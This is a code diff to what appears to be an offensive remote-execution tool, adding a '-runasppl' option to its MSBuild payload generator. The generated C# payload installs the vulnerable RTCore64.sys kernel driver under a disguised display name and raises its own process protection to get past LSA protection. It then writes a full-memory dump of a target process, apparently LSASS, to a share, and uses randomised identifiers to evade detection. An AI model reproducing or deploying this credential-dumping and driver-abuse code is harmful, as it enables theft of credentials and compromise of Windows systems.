@@ -806,7 +806,7 @@ def gen_payload_regsvr32(share_name, payload_name, addresses_array):
     return addresses_file
 
 
-def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array):
+def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array, runasppl):
     targetname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     taskname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     MiniDumpWithDataSegs = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
@@ -819,16 +819,21 @@ def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array)
     prochandle = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     procid = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     Dump = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    GetMyPID = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    myprocesses = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    myprocess = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    myid = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     GetPID = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     processes = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     id = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
-    process = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 15)))
+    process = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     IsAdministrator = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 25)))
     p = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     l = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     s = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     a = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     lines = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    RunAsPPLExe = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     addresses_file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     ipEntry = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     ip = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
@@ -893,6 +898,17 @@ def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array)
     xml_payload += "            }\n"
     xml_payload += "        }\n"
 
+    xml_payload += "        public static int %s() {\n" % (GetMyPID)
+    xml_payload += "            var %s = System.Diagnostics.Process.GetProcessesByName(System.Diagnostics.Process.GetCurrentProcess().ProcessName);\n" % (myprocesses)
+    xml_payload += "            var %s = 0;\n" % (myid)
+    xml_payload += "            foreach (var %s in %s)\n" % (myprocess, myprocesses)
+    xml_payload += "            {\n"
+    xml_payload += "                %s = %s.Id;\n" % (myid, myprocess)
+    xml_payload += "            }\n"
+
+    xml_payload += "            return %s;\n" % (myid)
+    xml_payload += "        }\n"
+
     xml_payload += "        public static int %s() {\n" % (GetPID)
     xml_payload += "            string %s = \"s\";\n" % (s)
     xml_payload += "            string %s = \"l\";\n" % (l)
@@ -930,9 +946,17 @@ def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array)
     xml_payload += "                        }\n"
     xml_payload += "                    }\n"
     xml_payload += "                }\n"
+    if runasppl:
+        xml_payload += "                Process.Start(\"cmd.exe\", @\"/c \" + \"sc.exe create RTCore64 type= kernel start= auto binPath= %s:\\\\RTCore64.sys DisplayName= \\\"Micro - Star MSI Afterburner\\\"\").WaitForExit();\n" % (drive_letter)
+        xml_payload += "                Process.Start(\"cmd.exe\", @\"/c \" + \"net start RTCore64\").WaitForExit();\n"
+        xml_payload += "                Process.Start(\"cmd.exe\", @\"/c \" + \"%s:\\\\\" +\"%s.exe protect \" + %s().ToString() + \" PPL Lsa\").WaitForExit();\n" % (drive_letter, RunAsPPLExe, GetMyPID)
+
     xml_payload += "                string filePath = \"%s:\\\\\" + System.Net.Dns.GetHostName() + %s + \".dmp\";\n" % (drive_letter, thismachinesip)
     xml_payload += "                Process %s = Process.GetProcessById(%s());\n" % (p, GetPID)
     xml_payload += "                %s(filePath, (Typ.%s | Typ.%s | Typ.%s | Typ.%s | Typ.%s), %s.Handle, (uint)%s.Id);\n" % (Dump, MiniDumpWithFullMemory, MiniDumpWithDataSegs, MiniDumpWithHandleData, MiniDumpWithThreadInfo, MiniDumpWithTokenInformation, p, p)
+    if runasppl:
+        xml_payload += "                Process.Start(\"cmd.exe\", @\"/c \" + \"net stop RTCore64\").WaitForExit();\n"
+        xml_payload += "                Process.Start(\"cmd.exe\", @\"/c \" + \"sc.exe delete RTCore64\").WaitForExit();\n"
 
     xml_payload += "            }\n"
     xml_payload += "			return true;\n"
@@ -949,6 +973,12 @@ def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array)
         for addr in addresses_array:
             f.write(addr + "\n")
         f.close()
+    if runasppl:
+        os.system('sudo cp {}/src/runaspplexp /var/tmp/{}/{}.exe'.format(cwd, share_name, RunAsPPLExe))
+        os.system('sudo chmod uog+rx /var/tmp/{}/{}.exe'.format(share_name, RunAsPPLExe))
+
+        os.system('sudo cp {}/src/RTCore64.sys /var/tmp/{}/RTCore64.sys'.format(cwd, share_name))
+        os.system('sudo chmod uog+rx /var/tmp/{}/RTCore64.sys'.format(share_name))
 
 
 def setup_share():
@@ -1268,6 +1298,7 @@ if __name__ == '__main__':
     parser.add_argument('-payload', '-p', action='store', default='msbuild', choices=['msbuild', 'regsvr32', 'dllsideload', 'exe'], help='Choose a payload type')
     parser.add_argument('-payloadname', action='store', help='Set the name for the payload file Default=random')
     parser.add_argument('-ip', action='store', help='Your local ip or network interface for the remote device to connect to')
+    parser.add_argument('-runasppl', action='store_true', default=False, help='Attempts to bypass RunAsPPL (WARNING THIS USES A SYSTEM DRIVER AND INTERACTS AT A KERNEL LEVEL DO NOT USE IN PROD)')
     parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default '
                                                        '"%s"). If errors are detected, run chcp.com at the target, '
                                                        'map the result with '
@@ -1310,6 +1341,15 @@ if __name__ == '__main__':
 
     # Init the example's logger theme
     logger.init(options.ts)
+
+    if options.runasppl and options.payload != "msbuild":
+        print("{}[!]{} RunAsPPL Bypass only works with the MsBuild payload".format(color_RED, color_reset))
+        sys.exit(0)
+
+    if options.runasppl:
+        plzno = input("{}[!]{} RunAsPPL Bypass uses a kernel driver are you absolutely sure you want to use this? (y/N)".format(color_YELL, color_reset))
+        if plzno.lower() != 'y':
+            sys.exit(0)
 
     if options.payload == 'dllsideload' and options.method == 'wmiexec':
         cont = input("{}[!]{} Warning you are attempting to run dllsideload via wmiexec which will work, however it will hang until timeout do you want to (c)ontinue, (n)o exit, or (y)es switch to smbexec: ".format(color_YELL, color_reset))
@@ -1420,7 +1460,7 @@ if __name__ == '__main__':
             addresses = ['23423.5463.1234.3465']
 
         if options.payload == 'msbuild':
-            gen_payload_msbuild(share_name, payload_name, drive_letter, addresses)  # creates the payload
+            gen_payload_msbuild(share_name, payload_name, drive_letter, addresses, options.runasppl)  # creates the payload
         elif options.payload == 'regsvr32':
             addresses_file = gen_payload_regsvr32(share_name, payload_name, addresses)
         elif options.payload == 'exe':
